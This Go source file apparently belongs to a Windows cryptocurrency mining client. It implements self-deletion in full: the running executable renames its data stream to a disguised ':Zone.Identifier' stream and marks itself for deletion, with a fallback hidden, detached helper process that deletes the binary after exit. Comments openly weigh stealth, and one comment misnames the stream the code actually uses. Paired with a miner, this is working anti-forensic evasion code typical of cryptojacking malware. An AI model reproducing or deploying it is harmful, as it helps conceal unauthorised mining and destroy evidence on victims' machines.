//go:build windows

// Package main implements a cryptocurrency mining client with
// self-deletion capabilities for Windows.
//
// The Windows self-deletion functionality is based on techniques from
// https://github.com/secur30nly/go-self-delete by secur30nly.
package main

import (
	"log"
	"strconv"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	FileRenameInfo      = 3
	FileDispositionInfo = 4
)

// FILE_RENAME_INFO represents the Windows FILE_RENAME_INFO structure
// used for file renaming operations via SetFileInformationByHandle.
type FILE_RENAME_INFO struct {
	ReplaceIfExists uint32 // BOOLEAN (4 bytes for alignment)
	RootDirectory   windows.Handle
	FileNameLength  uint32
	FileName        [1]uint16 // Variable length
}

// FILE_DISPOSITION_INFO represents the Windows FILE_DISPOSITION_INFO
// structure used to mark files for deletion when handles are closed.
type FILE_DISPOSITION_INFO struct {
	DeleteFile uint32 // BOOLEAN (4 bytes)
}

var (
	kernel32                       = windows.NewLazySystemDLL("kernel32.dll")
	procSetFileInformationByHandle = kernel32.NewProc("SetFileInformationByHandle")
	ntdll                          = windows.NewLazySystemDLL("ntdll.dll")
	procRtlCopyMemory              = ntdll.NewProc("RtlCopyMemory")
)

// deleteSelf attempts advanced self-deletion, with fallback to helper process
// This provides compatibility across Windows versions, including Windows 11 24H2
// where the advanced technique has known issues.
func deleteSelf(path string) {
	// Try advanced technique first
	if err := deleteSelfAdvanced(path); err != nil {
		log.Printf("Advanced deletion failed (%v), falling back to helper process", err)
		deleteSelfHelper(path)
	} else {
		log.Println("Executable marked for self-deletion (advanced technique)")
	}
}

// deleteSelfAdvanced implements advanced self-deletion using Windows internal APIs
// This technique:
// 1. Opens the executable with DELETE access
// 2. Renames it to an alternate data stream (:deadbeef)
// 3. Marks it for deletion when the handle closes
// Returns error if any step fails (for fallback handling)
func deleteSelfAdvanced(path string) error {
	// Stage 1: Open handle with DELETE access
	handle, err := openHandleForDeletion(path)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(handle)

	// Stage 2: Rename to alternate data stream
	if err := renameToADS(handle); err != nil {
		return err
	}

	// Stage 3: Mark for deletion
	if err := markForDeletion(handle); err != nil {
		return err
	}

	return nil
}

// deleteSelfHelper uses helper process method as fallback
// This is more compatible with Windows 11 24H2 where advanced technique may fail
// Trade-off: Less stealthy (creates child process) but reliable
func deleteSelfHelper(path string) {
	pid := windows.GetCurrentProcessId()

	// Get path to current executable
	exePath, err := windows.UTF16PtrFromString(path)
	if err != nil {
		log.Printf("Failed to convert path: %v", err)
		return
	}

	// Build command line: "executable --delete-helper PID path"
	cmdLine := path + " --delete-helper " + strconv.Itoa(int(pid)) + " " + path
	cmdLinePtr, err := windows.UTF16PtrFromString(cmdLine)
	if err != nil {
		log.Printf("Failed to build command line: %v", err)
		return
	}

	// Startup info with hidden window
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si)) // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE

	var pi windows.ProcessInformation

	// Create detached process
	err = windows.CreateProcess(
		exePath,
		cmdLinePtr,
		nil,
		nil,
		false,
		windows.CREATE_NEW_PROCESS_GROUP|windows.DETACHED_PROCESS,
		nil,
		nil,
		&si,
		&pi,
	)

	if err != nil {
		log.Printf("Failed to start deletion helper: %v", err)
		return
	}

	// Close handles immediately
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)

	log.Println("Executable scheduled for deletion via helper process (fallback)")
}

// openHandleForDeletion opens the file with DELETE access rights
func openHandleForDeletion(path string) (windows.Handle, error) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}

	handle, err := windows.CreateFile(
		pathPtr,
		windows.DELETE, // DELETE access
		windows.FILE_SHARE_READ|windows.FILE_SHARE_DELETE, // Allow sharing
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return 0, err
	}

	return handle, nil
}

// renameToADS renames the file to an alternate data stream
// This prevents the file from being visible in directory listings
func renameToADS(handle windows.Handle) error {
	newName := ":Zone.Identifier"
	newNameU16 := windows.StringToUTF16(newName)

	// Calculate size for FILE_RENAME_INFO structure
	fileNameBytes := len(newNameU16) * 2                                     // UTF-16 = 2 bytes per character
	structSize := int(unsafe.Sizeof(FILE_RENAME_INFO{})) + fileNameBytes - 2 // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block

	// Allocate buffer for FILE_RENAME_INFO
	buffer := make([]byte, structSize)
	renameInfo := (*FILE_RENAME_INFO)(unsafe.Pointer(&buffer[0])) // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
	renameInfo.ReplaceIfExists = 0                                // FALSE
	renameInfo.RootDirectory = 0
	renameInfo.FileNameLength = uint32(fileNameBytes)

	// Copy filename using RtlCopyMemory
	fileNamePtr := unsafe.Pointer(uintptr(unsafe.Pointer(renameInfo)) + unsafe.Offsetof(renameInfo.FileName)) // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
	_, _, _ = procRtlCopyMemory.Call(
		uintptr(fileNamePtr),
		uintptr(unsafe.Pointer(&newNameU16[0])), // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
		uintptr(fileNameBytes),
	)

	// Call SetFileInformationByHandle with FileRenameInfo
	ret, _, err := procSetFileInformationByHandle.Call(
		uintptr(handle),
		uintptr(FileRenameInfo),
		uintptr(unsafe.Pointer(renameInfo)), // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
		uintptr(structSize),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// markForDeletion marks the file for deletion when all handles are closed
func markForDeletion(handle windows.Handle) error {
	dispInfo := FILE_DISPOSITION_INFO{
		DeleteFile: 1, // TRUE
	}

	ret, _, err := procSetFileInformationByHandle.Call(
		uintptr(handle),
		uintptr(FileDispositionInfo),
		uintptr(unsafe.Pointer(&dispInfo)), // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
		uintptr(unsafe.Sizeof(dispInfo)),   // nosemgrep: go.lang.security.audit.unsafe.use-of-unsafe-block
	)

	if ret == 0 {
		return err
	}

	return nil
}

// runDeletionHelper is the helper process that waits for parent to exit and deletes the file
// This is called when the executable is launched with --delete-helper flag
func runDeletionHelper(pidStr, path string) {
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return
	}

	// Wait for parent process to exit by repeatedly checking if it's still running
	for {
		// Try to open the process - if it fails, process is gone
		handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
		if err != nil {
			// Process no longer exists
			break
		}
		windows.CloseHandle(handle)
		time.Sleep(100 * time.Millisecond)
	}

	// Give it a bit more time to fully release handles
	time.Sleep(500 * time.Millisecond)

	// Delete the file
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}

	err = windows.DeleteFile(pathPtr)
	if err != nil {
		// Silent failure - we're a helper process
		return
	}
}
